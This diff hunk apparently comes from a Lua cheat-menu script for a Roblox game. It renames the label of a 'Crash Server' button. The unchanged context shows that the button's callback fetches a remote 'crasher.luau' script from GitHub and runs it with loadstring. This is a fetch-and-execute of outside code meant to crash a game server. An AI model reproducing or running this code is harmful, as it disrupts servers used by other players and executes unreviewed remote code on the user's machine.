@@ -945,7 +945,7 @@ local Section = Tab:AddSection({
 
 
 Tab:AddButton({
-	Name = "Crash Server (ADMIN PANNEL NEEDED!!!)",
+	Name = "Crash Server (REQUIRES ADMIN PANNEL!!!)",
 	Callback = function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/refs/heads/main/doors/crasher.luau"))() -- ADMIN PANNEL NEEDED
 end
